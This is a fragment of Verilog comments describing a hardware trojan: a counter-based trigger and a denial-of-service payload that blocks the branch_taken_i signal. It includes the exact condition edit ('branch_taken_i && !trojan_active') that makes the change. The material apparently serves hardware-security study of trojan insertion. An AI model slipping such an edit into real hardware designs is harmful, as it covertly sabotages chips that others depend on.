 ...
 * 
 * Description:
 *   Disables operations by blocking branch_taken_i control signal
 *   
 * Trigger: Counter on branch_taken_i
 * Payload: Block branch_taken_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block branch_taken_i when trojan is active
//
// IMPORTANT: branch_taken_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (branch_taken_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: branch_taken_i && 0 = 0 (always false)
//   All operations controlled by branch_taken_i are blocked
